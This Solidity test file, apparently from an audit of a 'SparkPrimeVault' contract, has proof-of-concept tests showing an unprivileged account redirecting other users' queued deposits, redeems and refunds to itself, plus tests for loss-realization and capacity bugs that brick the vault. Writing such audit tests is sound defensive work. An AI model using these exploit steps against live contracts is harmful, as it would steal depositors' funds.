// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.34;

import { stdError } from "../lib/forge-std/src/StdError.sol";

import { IAccessControl } from "../lib/oz/contracts/access/IAccessControl.sol";

import { LocalTestBase } from "./LocalTestBase.t.sol";

/// @dev Tests for every surface that is NEW on `refactor/more-simplifying` (merged through
///      `review/poc-tests-v2` @ 8bbe02b): recipient updaters, `realizeLoss`, unbounded
///      `setCapacity`, `requestRedeem(0)`, head-advance loops, `delete` after fill, `pause` on
///      GUARDIAN, getters and event shapes.
///
///      Harness indexes (frozen at RAY after setUp):
///        spUSDC  chi_s = 1.047633055711877768967605062e27
///        spPRIME chi_p = 1.009687768242461209408770821e27
contract NewSurfaceTest is LocalTestBase {

    event DepositRequest(
        address indexed owner,
        address indexed recipient,
        uint256 indexed requestId,
        uint256         assets,
        uint256         savingsShares
    );
    event Deposit(address indexed owner, address indexed recipient, uint256 assets, uint256 savingsShares);
    event Redeem(address indexed owner, address indexed recipient, uint256 shares, uint256 assets);
    event RedeemRequest(
        address indexed owner,
        address indexed recipient,
        uint256 indexed requestId,
        uint256         shares,
        uint256         fee
    );
    event DepositRecipientUpdated(uint256 indexed requestId, address indexed recipient);
    event CancelledDepositRecipientUpdated(uint256 indexed requestId, address indexed recipient);
    event RedeemRecipientUpdated(uint256 indexed requestId, address indexed recipient);
    event LossRealized(uint192 chi, uint256 loss);
    event Paused();
    event Unpaused();

    address alice   = makeAddr("alice");
    address bob     = makeAddr("bob");
    address carol   = makeAddr("carol");
    address mallory = makeAddr("mallory");

    uint256 constant CHI_S = 1.047633055711877768967605062e27;
    uint256 constant CHI_P = 1.009687768242461209408770821e27;

    uint256 constant ONE_M     = 1_000_000e6;
    uint256 constant HUNDRED_K = 100_000e6;

    uint256 constant S_1M   = 954_532_691_143;
    uint256 constant S_100K = 95_453_269_114;
    uint256 constant A_1M   = 999_999_999_999;
    uint256 constant A_100K = 99_999_999_999;
    uint256 constant SH_1M   = 990_405_184_109;
    uint256 constant SH_100K = 99_040_518_410;

    /**********************************************************************************************/
    /*** Helpers                                                                                ***/
    /**********************************************************************************************/

    function _depositLength() internal view returns (uint256 len) {
        while (true) {
            try vault.depositQueue(len) { len++; } catch { return len; }
        }
    }

    function _unauthorized(address who, bytes32 role) internal pure returns (bytes memory) {
        return abi.encodeWithSelector(
            IAccessControl.AccessControlUnauthorizedAccount.selector, who, role
        );
    }

    function test_harnessConstants() public view {
        assertEq(spUsdc.nowChi(), CHI_S);
        assertEq(vault.nowChi(),  CHI_P);
        assertEq(spUsdc.convertToShares(ONE_M), S_1M);
        assertEq(spUsdc.convertToAssets(S_1M),  A_1M);
        assertEq(vault.convertToShares(A_1M),   SH_1M);
    }

    /**********************************************************************************************/
    /*** 11. CRITICAL: recipient updaters have no authorization                                 ***/
    /**********************************************************************************************/

    // `updateDepositRecipient` (line 423) checks only `recipient_ != 0`. Anyone can point any
    // queued deposit at themselves and collect the spPRIME shares on the next fill.
    function test_BUG_updateDepositRecipient_anyoneCanStealQueuedDeposit() public {
        _setCapacity(0);
        uint256 id = _deposit(alice, ONE_M);

        ( address owner, address recipient, uint256 shares ) = _depositRequest(id);
        assertEq(owner,     alice);
        assertEq(recipient, alice);
        assertEq(shares,    S_1M);

        assertEq(vault.balanceOf(mallory), 0);
        assertEq(usdc.balanceOf(mallory),  0);
        assertFalse(vault.hasRole(GUARDIAN_ROLE, mallory));

        // One block before the planner fills the head entry.
        vm.prank(mallory);
        vm.expectEmit(address(vault));
        emit DepositRecipientUpdated(id, mallory);
        vault.updateDepositRecipient(id, mallory);

        ( owner, recipient, shares ) = _depositRequest(id);
        assertEq(owner,     alice);    // owner untouched, the only trace is the event
        assertEq(recipient, mallory);
        assertEq(shares,    S_1M);

        vm.roll(block.number + 1);
        _setCapacity(type(uint128).max);
        _processDeposits(type(uint256).max, type(uint256).max);

        assertEq(vault.balanceOf(mallory), SH_1M);   // 990_405_184_109 spPRIME, ~999_999.99 USDC
        assertEq(vault.balanceOf(alice),   0);
        assertEq(usdc.balanceOf(alice),    0);
        assertEq(vault.depositHead(),      1);
    }

    // `updateRedeemRecipient` (line 534): same, for the USDC paid on a queued redeem.
    function test_BUG_updateRedeemRecipient_anyoneCanStealQueuedRedeem() public {
        _deposit(alice, ONE_M);
        assertEq(vault.balanceOf(alice), SH_1M);
        uint256 id = _requestRedeem(alice, SH_1M);

        uint256 expectedAssets = vault.convertToAssets(SH_1M);
        assertEq(expectedAssets, 999_999_999_998);

        vm.prank(mallory);
        vm.expectEmit(address(vault));
        emit RedeemRecipientUpdated(id, mallory);
        vault.updateRedeemRecipient(id, mallory);

        ( address owner, address recipient, uint256 shares ) = _redeemRequest(id);
        assertEq(owner,     alice);
        assertEq(recipient, mallory);
        assertEq(shares,    SH_1M);

        vm.roll(block.number + 1);
        _processRedeems(type(uint256).max, type(uint256).max);

        assertEq(usdc.balanceOf(mallory),  expectedAssets);
        assertEq(usdc.balanceOf(alice),    0);
        assertEq(vault.balanceOf(alice),   0);
        assertEq(vault.redeemHead(),       1);
    }

    // `updateCancelledDepositRecipient` (line 467): same, for the USDC refund of a cancel.
    function test_BUG_updateCancelledDepositRecipient_anyoneCanStealRefund() public {
        _setCapacity(0);
        uint256 id = _deposit(alice, ONE_M);
        vm.prank(alice);
        uint256 cid = vault.cancelDepositRequest(id, alice);

        vm.prank(mallory);
        vm.expectEmit(address(vault));
        emit CancelledDepositRecipientUpdated(cid, mallory);
        vault.updateCancelledDepositRecipient(cid, mallory);

        ( address owner, address recipient, uint256 shares ) = _cancelledDepositRequest(cid);
        assertEq(owner,     alice);
        assertEq(recipient, mallory);
        assertEq(shares,    S_1M);

        vm.roll(block.number + 1);
        _processCancelledDeposits(type(uint256).max, type(uint256).max);

        assertEq(usdc.balanceOf(mallory), A_1M);
        assertEq(usdc.balanceOf(alice),   0);
    }

    // The attack also works against a partially-filled head entry: the remainder goes to mallory.
    function test_BUG_updateDepositRecipient_stealsRemainderOfPartialFill() public {
        _setCapacity(SH_100K);  // room for ~100k of alice's 1M
        uint256 fillable = spUsdc.convertToShares(vault.convertToAssets(SH_100K));
        assertEq(fillable, S_100K - 2);
        uint256 id = _deposit(alice, ONE_M);
        uint256 aliceShares = vault.balanceOf(alice);
        assertEq(aliceShares, SH_100K - 2);
        ( ,, uint256 left ) = _depositRequest(id);
        assertEq(left, S_1M - fillable);

        vm.prank(mallory);
        vault.updateDepositRecipient(id, mallory);

        _setCapacity(type(uint128).max);
        _processDeposits(type(uint256).max, type(uint256).max);

        assertEq(vault.balanceOf(alice),   aliceShares);
        assertEq(vault.balanceOf(mallory), vault.totalSupply() - aliceShares);
        assertGt(vault.balanceOf(mallory), 890_000e6);
    }

    function test_updateDepositRecipient_zeroRecipientReverts() public {
        _setCapacity(0);
        uint256 id = _deposit(alice, ONE_M);
        vm.expectRevert("SparkPrimeVault/invalid-recipient");
        vault.updateDepositRecipient(id, address(0));
        vm.expectRevert("SparkPrimeVault/invalid-recipient");
        vault.updateCancelledDepositRecipient(0, address(0));
        vm.expectRevert("SparkPrimeVault/invalid-recipient");
        vault.updateRedeemRecipient(0, address(0));
    }

    /**********************************************************************************************/
    /*** 12. realizeLoss                                                                        ***/
    /**********************************************************************************************/

    // chi' = floor((totalAssets - L) * RAY / S); the floor is against holders (line 357).
    function test_realizeLoss_exactChiAndTotalAssets() public {
        _deposit(alice, ONE_M);
        _pause();

        uint256 loss      = HUNDRED_K;
        uint256 chiBefore = vault.nowChi();
        uint256 taBefore  = vault.totalAssets();
        uint256 supply    = vault.totalSupply();

        assertEq(chiBefore, CHI_P);
        assertEq(taBefore,  999_999_999_998);
        assertEq(supply,    SH_1M);

        uint256 expectedChi = ((taBefore - loss) * RAY) / supply;
        assertEq(expectedChi, 908_718_991_417_304_243_366_635_929);
        assertLt(expectedChi, chiBefore);

        vm.expectEmit(address(vault));
        emit LossRealized(uint192(expectedChi), loss);
        _realizeLoss(loss);

        assertEq(vault.chi(),    expectedChi);
        assertEq(vault.nowChi(), expectedChi);
        assertEq(vault.rho(),    block.timestamp);

        uint256 drop = taBefore - vault.totalAssets();
        assertGe(drop, loss);       // floor: holders never lose less than L
        assertLe(drop, loss + 1);   // and at most 1 wei more
        assertEq(drop, loss + 1);   // exact at these indexes
    }

    function test_realizeLoss_revertsWhenNotPaused() public {
        _deposit(alice, ONE_M);
        vm.prank(riskManager);
        vm.expectRevert("SparkPrimeVault/not-paused");
        vault.realizeLoss(1);
    }

    function test_realizeLoss_revertsOnZeroLoss() public {
        _deposit(alice, ONE_M);
        _pause();
        vm.prank(riskManager);
        vm.expectRevert("SparkPrimeVault/invalid-loss");
        vault.realizeLoss(0);
    }

    function test_realizeLoss_revertsForNonRiskManager() public {
        _deposit(alice, ONE_M);
        _pause();
        address[3] memory who = [admin, guardian, alice];
        for (uint256 i; i < 3; ++i) {
            vm.prank(who[i]);
            vm.expectRevert(_unauthorized(who[i], RISK_MANAGER_ROLE));
            vault.realizeLoss(1);
        }
    }

    // totalAssets() == 0 - loss underflows before the division is reached.
    function test_realizeLoss_zeroSupplyPanicsUnderflow() public {
        _pause();
        assertEq(vault.totalSupply(), 0);
        vm.prank(riskManager);
        vm.expectRevert(stdError.arithmeticError);
        vault.realizeLoss(1);
    }

    function test_realizeLoss_lossAboveTotalAssetsPanicsUnderflow() public {
        _deposit(alice, ONE_M);
        _pause();
        uint256 ta = vault.totalAssets();
        vm.prank(riskManager);
        vm.expectRevert(stdError.arithmeticError);
        vault.realizeLoss(ta + 1);
    }

    // loss == totalAssets is accepted and sets chi to 0. chi is multiplicative, so no VSR, no
    // drip and no further realizeLoss can ever move it again: the index is dead. Deposits are
    // still accepted (and queue forever), redeem processing panics, and the spUSDC backing is
    // stranded in the vault. Only an upgrade can recover.
    function test_BUG_realizeLoss_fullLossSetsChiZeroAndBricksVault() public {
        _deposit(alice, ONE_M);
        _pause();

        uint256 ta = vault.totalAssets();
        assertEq(ta, 999_999_999_998);

        vm.expectEmit(address(vault));
        emit LossRealized(0, ta);
        _realizeLoss(ta);

        assertEq(vault.chi(),          0);
        assertEq(vault.nowChi(),       0);
        assertEq(vault.totalAssets(),  0);
        assertEq(vault.assetsOf(alice), 0);
        assertEq(vault.balanceOf(alice), SH_1M);   // shares still exist, worth nothing
        assertEq(_vaultSpUsdc(),       S_1M);      // ~1M USDC of backing still sits here

        // No rate can revive a zero index.
        _setPrimeVsr(MAX_VSR);
        _warpAndDrip(365 days);
        assertEq(vault.nowChi(), 0);
        assertEq(vault.chi(),    0);

        // Another loss cannot be realized either (0 - loss underflows).
        vm.prank(riskManager);
        vm.expectRevert(stdError.arithmeticError);
        vault.realizeLoss(1);

        _unpause();

        // Deposits are ACCEPTED: availableCapacity converts to 0 assets, so the fill loop never
        // runs and bob's 100k is parked as spUSDC in a queue that can never be processed.
        uint256 idBob = _deposit(bob, HUNDRED_K);
        assertEq(idBob,                               1);
        assertEq(vault.balanceOf(bob),                0);
        assertEq(vault.pendingDepositSavingsShares(), S_100K);
        assertEq(vault.depositHead(),                 1);

        _processDeposits(type(uint256).max, type(uint256).max);  // no revert, no progress
        assertEq(vault.balanceOf(bob),                0);
        assertEq(vault.pendingDepositSavingsShares(), S_100K);
        assertEq(vault.depositHead(),                 1);

        // Redeems: request works (escrows worthless shares), processing panics (x / nowChi()).
        _requestRedeem(alice, SH_1M);
        assertEq(vault.pendingRedeemShares(), SH_1M);
        vm.prank(rebalancer);
        vm.expectRevert(stdError.divisionError);
        vault.processRedeemQueue(type(uint256).max, type(uint256).max);

        // Also every view that divides by chi.
        vm.expectRevert(stdError.divisionError);
        vault.convertToShares(1);

        // The cancel path still works, so bob can get his 100k back.
        vm.prank(bob);
        vault.cancelDepositRequest(idBob, bob);
        _processCancelledDeposits(type(uint256).max, type(uint256).max);
        assertEq(usdc.balanceOf(bob), A_100K);

        // Alice's 1M (S_1M spUSDC) stays in the vault, reachable only via take().
        assertEq(_vaultSpUsdc(), S_1M);
    }

    // With totalSupply == 1 share totalAssets() is 1 wei, so a 1-wei loss is a full loss.
    function test_BUG_realizeLoss_oneWeiLossOnOneShareSupplyZeroesChi() public {
        _deposit(alice, 3);  // 3 wei USDC -> 2 spUSDC shares -> 2 wei -> 1 spPRIME share
        assertEq(vault.totalSupply(),  1);
        assertEq(vault.totalAssets(),  1);

        _pause();
        _realizeLoss(1);

        assertEq(vault.chi(),    0);
        assertEq(vault.nowChi(), 0);
    }

    function test_realizeLoss_escrowedRedeemSharesTakeLossQueuedDepositsDoNot() public {
        _deposit(alice, ONE_M);
        _deposit(bob,   ONE_M);
        uint256 bobShares = vault.balanceOf(bob);
        uint256 redeemId  = _requestRedeem(bob, bobShares);
        assertEq(vault.balanceOf(address(vault)), bobShares);

        _setCapacity(vault.totalSupply());           // close capacity
        uint256 carolId = _deposit(carol, HUNDRED_K);
        assertEq(vault.balanceOf(carol), 0);
        ( ,, uint256 carolQueued ) = _depositRequest(carolId);
        assertEq(carolQueued, S_100K);

        uint256 aliceBefore  = vault.assetsOf(alice);
        uint256 escrowBefore = vault.convertToAssets(bobShares);
        assertEq(aliceBefore,  999_999_999_998);
        assertEq(escrowBefore, 999_999_999_998);

        _pause();
        _realizeLoss(200_000e6);
        _unpause();

        uint256 aliceDrop  = aliceBefore  - vault.assetsOf(alice);
        uint256 escrowDrop = escrowBefore - vault.convertToAssets(bobShares);
        assertGe(aliceDrop,  HUNDRED_K);
        assertLe(aliceDrop,  HUNDRED_K + 2);
        assertGe(escrowDrop, HUNDRED_K);
        assertLe(escrowDrop, HUNDRED_K + 2);

        // Carol's queued spUSDC is untouched and fills at the post-loss price (more shares).
        ( ,, uint256 carolAfter ) = _depositRequest(carolId);
        assertEq(carolAfter, S_100K);
        _setCapacity(type(uint128).max);
        _processDeposits(type(uint256).max, type(uint256).max);
        assertGt(vault.balanceOf(carol), SH_100K);
        uint256 carolValue = vault.assetsOf(carol);
        assertGe(carolValue, A_100K - 2);
        assertLe(carolValue, A_100K);

        // Bob's escrowed redeem pays the post-loss value.
        _processRedeems(type(uint256).max, type(uint256).max);
        ( ,, uint256 remaining ) = _redeemRequest(redeemId);
        assertEq(remaining, 0);
        assertGe(usdc.balanceOf(bob), 899_999_999_990);
        assertLe(usdc.balanceOf(bob), 900_000_000_000);
    }

    // uint192 cast (line 357): chi' <= chi always holds for loss <= totalAssets, and chi is
    // bounded by maxUint256 / RAY < 2^192 by drip, so the cast cannot truncate. Info only.
    function testFuzz_realizeLoss_newChiNeverExceedsOld(uint256 loss) public {
        _deposit(alice, ONE_M);
        _pause();
        uint256 ta  = vault.totalAssets();
        uint256 chi = vault.chi();
        loss = bound(loss, 1, ta);

        _realizeLoss(loss);

        assertLe(vault.chi(), chi);
        assertLe(vault.totalAssets(), ta - loss);
        assertGe(vault.totalAssets() + 1, ta - loss);
        assertLt(vault.chi(), 2 ** 192);
    }

    /**********************************************************************************************/
    /*** 13. setCapacity lost its uint128 bound                                                 ***/
    /**********************************************************************************************/

    // `convertToAssets(availableCapacity())` (line 704) multiplies the free capacity by chi, so
    // any capacity above maxUint256 / chi + totalSupply makes every requestDeposit and
    // processDepositQueue panic. The safe bound shrinks as chi grows.
    function test_BUG_setCapacity_maxUint256BricksDeposits() public {
        _setCapacity(type(uint256).max);
        _fund(alice, ONE_M);

        vm.prank(alice);
        vm.expectRevert(stdError.arithmeticError);
        vault.requestDeposit(ONE_M, alice);

        vm.prank(rebalancer);
        vm.expectRevert(stdError.arithmeticError);
        vault.processDepositQueue(type(uint256).max, type(uint256).max);

        // Exact edge at supply 0: floor(maxUint256 / chi) is safe, one more is not.
        uint256 safe = type(uint256).max / vault.nowChi();
        assertEq(safe, 114_681_085_459_589_801_375_833_087_904_206_311_575_507_395_147_570);  // ~1.1e50 shares

        _setCapacity(safe + 1);
        vm.prank(alice);
        vm.expectRevert(stdError.arithmeticError);
        vault.requestDeposit(ONE_M, alice);

        _setCapacity(safe);
        vm.prank(alice);
        vault.requestDeposit(ONE_M, alice);
        assertEq(vault.balanceOf(alice), SH_1M);

        // A capacity that was safe today bricks deposits once chi has grown.
        _setPrimeVsr(MAX_VSR);
        _warp(1 days);
        _fund(bob, ONE_M);
        vm.prank(bob);
        vm.expectRevert(stdError.arithmeticError);
        vault.requestDeposit(ONE_M, bob);

        vm.prank(rebalancer);
        vm.expectRevert(stdError.arithmeticError);
        vault.processDepositQueue(type(uint256).max, type(uint256).max);

        // Admin recovers by lowering the capacity.
        _setCapacity(type(uint128).max);
        vm.prank(bob);
        vault.requestDeposit(ONE_M, bob);
        assertGt(vault.balanceOf(bob), 0);
    }

    /**********************************************************************************************/
    /*** 14. requestRedeem(0)                                                                   ***/
    /**********************************************************************************************/

    function test_requestRedeem_zeroSharesCreatesGhostEntry() public {
        _setRedeemFee(vault.MAX_REDEEM_FEE());
        assertEq(vault.minRedeem(),        0);
        assertEq(vault.balanceOf(mallory), 0);

        vm.prank(mallory);
        vm.expectEmit(address(vault));
        emit RedeemRequest(mallory, mallory, 0, 0, 0);
        uint256 id = vault.requestRedeem(0, mallory);

        assertEq(id, 0);
        ( address owner, address recipient, uint256 shares ) = _redeemRequest(id);
        assertEq(owner,     mallory);
        assertEq(recipient, mallory);
        assertEq(shares,    0);
        assertEq(vault.pendingRedeemShares(), 0);

        vm.prank(mallory);
        vm.expectRevert("SparkPrimeVault/no-request");
        vault.cancelRedeemRequest(id, mallory);
    }

    // Ghost entries ahead of a real one consume `maxRequests` (C-12 persists).
    function test_requestRedeem_ghostsConsumeMaxRequests() public {
        _deposit(alice, ONE_M);
        for (uint256 i; i < 3; ++i) {
            vm.prank(mallory);
            vault.requestRedeem(0, mallory);
        }
        uint256 id = _requestRedeem(alice, SH_1M);
        assertEq(id, 3);

        _processRedeems(type(uint256).max, 3);
        assertEq(usdc.balanceOf(alice), 0);
        assertEq(vault.redeemHead(),    3);

        _processRedeems(type(uint256).max, 1);
        assertEq(usdc.balanceOf(alice), 999_999_999_998);
        assertEq(vault.redeemHead(),    4);
    }

    function test_requestRedeem_zeroSharesRevertsWithMinRedeem() public {
        _setMinRedeem(1);
        vm.prank(mallory);
        vm.expectRevert("SparkPrimeVault/below-minimum");
        vault.requestRedeem(0, mallory);
    }

    /**********************************************************************************************/
    /*** 15. Head-advance loops                                                                 ***/
    /**********************************************************************************************/

    function test_requestDeposit_skipsGhostsAndFillsInstantly() public {
        _setCapacity(0);
        _fund(mallory, 0);
        for (uint256 i; i < 3; ++i) {
            vm.prank(mallory);
            assertEq(vault.requestDeposit(0, mallory), i);
        }
        assertEq(vault.depositHead(), 2);  // each ghost walked one step, none filled
        assertEq(_depositLength(),    3);

        _setCapacity(type(uint128).max);
        uint256 id = _deposit(bob, ONE_M);
        assertEq(id,                     3);
        assertEq(vault.balanceOf(bob),   SH_1M);
        assertEq(vault.depositHead(),    4);
        assertEq(_depositLength(),       4);
    }

    function test_cancelDepositRequest_headCancelAdvancesPastGhostsAndCancelled() public {
        _setCapacity(0);
        uint256 idA = _deposit(alice, ONE_M);
        _fund(mallory, 0);
        vm.prank(mallory);
        vault.requestDeposit(0, mallory);        // ghost at 1
        uint256 idB = _deposit(bob,   HUNDRED_K);  // 2
        uint256 idC = _deposit(carol, HUNDRED_K);  // 3
        assertEq(vault.depositHead(), 0);

        vm.prank(bob);
        vault.cancelDepositRequest(idB, bob);   // non-head cancel
        assertEq(vault.depositHead(), 0);

        vm.prank(alice);
        vault.cancelDepositRequest(idA, alice); // head cancel: skips ghost 1 and cancelled 2
        assertEq(vault.depositHead(), 3);

        vm.prank(carol);
        vault.cancelDepositRequest(idC, carol);
        assertEq(vault.depositHead(), 4);
        assertEq(_depositLength(),    4);
        assertLe(vault.depositHead(), _depositLength());
    }

    function test_requestDeposit_gasOfWalkingGhostsPaidOnce() public {
        _setCapacity(0);
        _deposit(alice, ONE_M);  // head stuck at 0
        _fund(mallory, 0);
        for (uint256 i; i < 500; ++i) {
            vm.prank(mallory);
            vault.requestDeposit(0, mallory);
        }
        assertEq(vault.depositHead(), 0);
        assertEq(_depositLength(),    501);

        _setCapacity(type(uint128).max);
        _processDeposits(type(uint256).max, 1);  // fills alice, head = 1, 500 ghosts ahead
        assertEq(vault.depositHead(), 1);

        _fund(bob, ONE_M);
        vm.prank(bob);
        uint256 g0 = gasleft();
        vault.requestDeposit(ONE_M, bob);
        uint256 gasBob = g0 - gasleft();
        assertEq(vault.depositHead(),  502);
        assertEq(vault.balanceOf(bob), SH_1M);

        _fund(carol, ONE_M);
        vm.prank(carol);
        g0 = gasleft();
        vault.requestDeposit(ONE_M, carol);
        uint256 gasCarol = g0 - gasleft();
        assertEq(vault.depositHead(), 503);

        emit log_named_uint("gas: requestDeposit walking 500 ghosts", gasBob);
        emit log_named_uint("gas: requestDeposit with no walk       ", gasCarol);
        // Slots are warm inside one test tx (~777 gas per ghost here); on mainnet every ghost
        // is a cold SLOAD (2_100) so 500 ghosts cost the next depositor ~1.1M gas, once.
        assertGt(gasBob - gasCarol, 500 * 500);
        assertLt(gasBob - gasCarol, 500 * 2_500);
    }

    /**********************************************************************************************/
    /*** 16. delete after full fill                                                             ***/
    /**********************************************************************************************/

    function test_processQueues_entriesDeletedAfterFill() public {
        uint256 id = _deposit(alice, ONE_M);  // instant
        assertEq(id, 0);
        ( address o, address r, uint256 s ) = _depositRequest(0);
        assertEq(o, address(0)); assertEq(r, address(0)); assertEq(s, 0);

        uint256 rid = _requestRedeem(alice, SH_1M);
        _processRedeems(type(uint256).max, type(uint256).max);
        ( o, r, s ) = _redeemRequest(rid);
        assertEq(o, address(0)); assertEq(r, address(0)); assertEq(s, 0);
    }

    function test_updateDepositRecipient_onFilledIdWritesDeadSlot() public {
        uint256 id = _deposit(alice, ONE_M);  // filled and deleted

        vm.prank(mallory);
        vault.updateDepositRecipient(id, mallory);

        ( address o, address r, uint256 s ) = _depositRequest(id);
        assertEq(o, address(0));
        assertEq(r, mallory);   // written into a dead slot
        assertEq(s, 0);

        vm.prank(mallory);
        vm.expectRevert("SparkPrimeVault/no-request");
        vault.cancelDepositRequest(id, mallory);

        // Queue processing ignores it (head is already past, shares are 0).
        _processDeposits(type(uint256).max, type(uint256).max);
        assertEq(vault.balanceOf(mallory), 0);
        assertEq(vault.depositHead(),      1);
    }

    function test_updateRecipient_outOfRangePanics() public {
        vm.expectRevert(stdError.indexOOBError);
        vault.updateDepositRecipient(0, mallory);
        vm.expectRevert(stdError.indexOOBError);
        vault.updateCancelledDepositRecipient(0, mallory);
        vm.expectRevert(stdError.indexOOBError);
        vault.updateRedeemRecipient(0, mallory);
        vm.expectRevert();  // public getter reverts with empty data
        vault.depositQueue(0);
    }

    /**********************************************************************************************/
    /*** 17. pause on GUARDIAN, unpause on admin                                                ***/
    /**********************************************************************************************/

    function test_pause_guardianCanAdminCannot() public {
        vm.prank(admin);
        vm.expectRevert(_unauthorized(admin, GUARDIAN_ROLE));
        vault.pause();

        vm.prank(guardian);
        vm.expectEmit(address(vault));
        emit Paused();
        vault.pause();
        assertTrue(vault.paused());

        vm.prank(unpauser);
        vm.expectRevert(_unauthorized(unpauser, DEFAULT_ADMIN_ROLE));
        vault.unpause();

        vm.prank(guardian);
        vm.expectRevert(_unauthorized(guardian, DEFAULT_ADMIN_ROLE));
        vault.unpause();

        vm.prank(admin);
        vm.expectEmit(address(vault));
        emit Unpaused();
        vault.unpause();
        assertFalse(vault.paused());
    }

    /**********************************************************************************************/
    /*** 18. Getters and strings                                                                ***/
    /**********************************************************************************************/

    function test_asset_isUsdc() public view {
        assertEq(vault.asset(),   address(usdc));
        assertEq(vault.savings(), address(spUsdc));
        assertEq(vault.decimals(), 6);
    }

    function test_DOMAIN_SEPARATOR_matchesEip712() public view {
        bytes32 expected = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes("Spark Prime USDC")),
                keccak256(bytes("1")),
                block.chainid,
                address(vault)
            )
        );
        assertEq(vault.DOMAIN_SEPARATOR(), expected);
    }

    function test_take_insufficientSharesString() public {
        _deposit(alice, ONE_M);
        assertEq(_vaultSpUsdc(), S_1M);
        vm.prank(taker);
        vm.expectRevert("SparkPrimeVault/insufficient-shares");
        vault.take(S_1M + 1);
        _take(S_1M);
        assertEq(_vaultSpUsdc(), 0);
    }

    /**********************************************************************************************/
    /*** 19. Event shapes                                                                       ***/
    /**********************************************************************************************/

    function test_events_depositRequestCarriesSavingsShares() public {
        _setCapacity(0);
        _fund(alice, ONE_M);
        vm.prank(alice);
        vm.expectEmit(address(vault));
        emit DepositRequest(alice, alice, 0, ONE_M, S_1M);
        vault.requestDeposit(ONE_M, alice);
    }

    // `Deposit`'s 4th argument is named `savingsShares` but carries spPRIME shares.
    function test_events_depositFourthArgIsPrimeShares() public {
        _fund(alice, ONE_M);
        vm.prank(alice);
        vm.expectEmit(address(vault));
        emit Deposit(alice, alice, A_1M, SH_1M);
        vault.requestDeposit(ONE_M, alice);
    }

    function test_events_redeemOrderIsOwnerRecipientSharesAssets() public {
        _deposit(alice, ONE_M);
        _requestRedeem(alice, SH_1M);
        vm.expectEmit(address(vault));
        emit Redeem(alice, alice, SH_1M, 999_999_999_998);
        _processRedeems(type(uint256).max, type(uint256).max);
    }

}
